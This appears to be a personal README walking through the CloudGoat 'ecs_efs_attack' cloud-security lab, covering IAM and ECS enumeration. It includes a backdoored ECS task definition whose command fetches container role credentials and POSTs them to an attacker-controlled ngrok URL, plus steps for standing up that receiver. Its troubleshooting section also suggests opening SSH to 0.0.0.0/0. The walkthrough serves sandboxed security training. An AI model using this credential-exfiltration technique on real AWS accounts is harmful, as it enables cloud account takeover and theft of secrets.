# Rhino-Security-Labs
Practicing the Rhino Security Labs

# Installation
1. Install Terraform https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
2. Install Cloudgoat - a sandbox environment to perform cloud based vulnerbility testing https://github.com/RhinoSecurityLabs/cloudgoat#quick-start

# Scenarios
## EFS ECS attack
The goal of this mission is to mount a file system on EFS and retrieve the flag. To build the resources for the scenario:
```
./cloudgoat.py create ecs_efs_attack
cd ecs_efs_attack<random generated strings>
```
### Privilege Enumeration
1. SSH into the instance ```ssh -i cloudgoat ubuntu@<IP address of ruse>```
2. Create a new profile (inherits the permissions from the EC2) ```aws configure --profile ruse```
3. Get the instance profile for the EC2 instance ```aws sts get-caller-identity```. The role name is found like so: arn:aws:sts::<account id>:assumed-role/<role name>/<instance id>
4. List the attached policies - 
  ```
  aws iam list-attached-role-policies --role-name <Role name>
   {
    "AttachedPolicies": [
        {
            "PolicyName": "cg-ec2-ruse-role-policy-ecs_efs_attack_cgid6sec93nj4n",
            "PolicyArn": "arn:aws:iam::<account id>:policy/<policy arn>"
        },
        {
            "PolicyName": "AmazonSSMManagedInstanceCore",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
        }
    ]
  }
  ```
5. Get the actual policy document - 
  ```
  aws iam get-policy-version --policy-arn arn:aws:iam::<account id>:policy/cg-ec2-ruse-role-policy-ecs_efs_attack_cgid6sec93nj4n --version-id v1
  {
      "PolicyVersion": {
          "Document": {
              "Statement": [
                  {
                      "Action": [
                          "ecs:Describe*",
                          "ecs:List*",
                          "ecs:RegisterTaskDefinition",
                          "ecs:UpdateService",
                          "iam:PassRole",
                          "iam:List*",
                          "iam:Get*",
                          "ec2:CreateTags",
                          "ec2:DescribeInstances",
                          "ec2:DescribeImages",
                          "ec2:DescribeTags",
                          "ec2:DescribeSnapshots"
                      ],
                      "Effect": "Allow",
                      "Resource": "*",
                      "Sid": "VisualEditor0"
                  }
              ],
              "Version": "2012-10-17"
          },
          "VersionId": "v1",
          "IsDefaultVersion": true,
          "CreateDate": "2023-04-13T04:01:32+00:00"
      }
  }
  ```
  We can see that the actions that are allowed e.g. EC2 (read), ECS (read and write) and iam (read)

### EC2 Enumeration
1. List all ec2 instances - ```aws ec2 describe-instances```. If you have lots of instances, filter by region and running state: ``` aws ec2 describe-instances --region us-east-1 --filters "Name=instance-state-name, Values=running"```
  Found 2 instances. With StartSession SSM tagged with both:
    * cg-ruse-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion true)
    * cg-admin-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion false)

### ECS Enumeration
1. List clusters - 
  ```
  aws ecs list-clusters
  {
      "clusterArns": [
          "arn:aws:ecs:us-east-1:<account id>:cluster/<cluster id>"
      ]
  }
  ```
2. List the services with the cluster to know which task we can update in order to go into the admin EC2. ECS highest level is a cluster-> service->task.
 ```
  aws ecs list-services --cluster <cluster arn>
  
  ```
  {
    "serviceArns": [
        "arn:aws:ecs:us-east-1:<account id>:service/<cluster name>/<service name>"
    ]
}
3. Describe the services to find task definition name
  ```
  aws ecs describe-services --cluster <cluster name> --services <service name>
  ...
  "taskDefinition": "<task definition arn>",
  ...
  ```
4. Describe the task definition and output to a file so we are able to change the behaviour
  ```
  aws ecs describe-task-definition --task-definition webapp:1 > backdoor.json
  ```
5. Change backdoor.json to the following:
```
{
	"containerDefinitions": [{
		"name": "webapp",
		"image": "python:latest",
		"cpu": 128,
		"memory": 128,
		"memoryReservation": 64,
		"portMappings": [{
			"containerPort": 80,
			"hostPort": 80,
			"protocol": "tcp"
		}],
		"essential": true,
		"entryPoint": ["sh", "-c"],
		"command": [
			"/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json <NGROK URL>/data \" "
		],
		"environment": [],
		"mountPoints": [],
		"volumesFrom": []
	}],
	"family": "webapp",
	"taskRoleArn": "<task role arn>",
	"executionRoleArn": "<task role arn>",
	"networkMode": "awsvpc",
	"volumes": [],
	"placementConstraints": [],
	"requiresCompatibilities": ["FARGATE"],
	"cpu": "256",
	"memory": "512"
}
```
6. In order to create a ngrok url, we can firstly create a http server using node.js and then use ngrok to host the service.
    1. To create an http server, install node on your machine: https://nodejs.org/en/download
        1. Create a index.js file with the contents of index.js in this repository
        2. Run the http server: ```node index.js```
        3. Validate that is working by going to ```http://localhost:8080
    2. To host your http server, follow the steps to install ngrok: https://ngrok.com/download
      1. Once you have successfully ran the installations, start a tunnel by typing: ```ngrok http 8080```
      2. There should be a Forwarding url that will be displayed in which your website will be hosted, use that url as the NGROK URL above.
      ![image](https://user-images.githubusercontent.com/39514108/232182632-27d9dd76-7cf7-42e5-8858-6ff701f980e9.png)
      3. Validate that you are able to post data to the NGROK url by using ```curl -X POST -d "random string" <NGROK URL>/data```
7. Register the task
```
aws ecs register-task-definition --cli-input-json file://backdoor.json
aws ecs update-service --serivce <service ARN> --cluster <cluster ARN> --task-definition <task ARN>
```
8. After a few minutes, you should see that the credentials are sent through in the Node terminal or in the ngrok web interface in the following format
```
{"RoleArn":<ROLEARN>, "AccessKeyId": <AccessKeyId> "SecretAccessKey":<SecretAccessKey">}
```
  
# Trouble Shooting
## Installation

#### Cloudgoat - ```No whitelist.txt file was found at /Users/huajanel/cloudgoat/whitelist.txt ... Unknown error: Unable to retrieve IP address.```
With the --auto feature, the whitelist is created automatically. However, if it is not able to find the IP address due to VPN, etc., restrictions, then perform the following commands
```
ifconfig <- For MAC, retrieve IP Address
cd cloudgoat
nano whitelist.txt <- Ensure that the IP address has a CIDR of /32 at the end
python3 cloudgoat.py config whitelist
```

## Scenarios
#### ```The create command requires the use of the --profile flag, or a default profile defined in the config.yml file (try "config profile")```
Update the config file for cloudgoat to add your aws profile. An access key and secret access key must be created first.
```
cd cloudgoat
nano ./config.yml
<Edit cloudgoat_aws_access_key with the appropriate access key. Same with secret access key.>
```
#### ```ssh: connect to host <IP address> port 22: Operation timed out```
This error could be caused if your whitelist IP address was not correct. To find the correct IP address, in the ec2 console of the account, change the targeted instance, SSH rule to allow 0.0.0.0/0.
Then in the terminal SSH as normal e.g. ```ssh -i <key pair> ubuntu@<IP address>```
Find your ip address by: ```who am i```
Copy the IP address to the EC2 console SSH rule to change. 
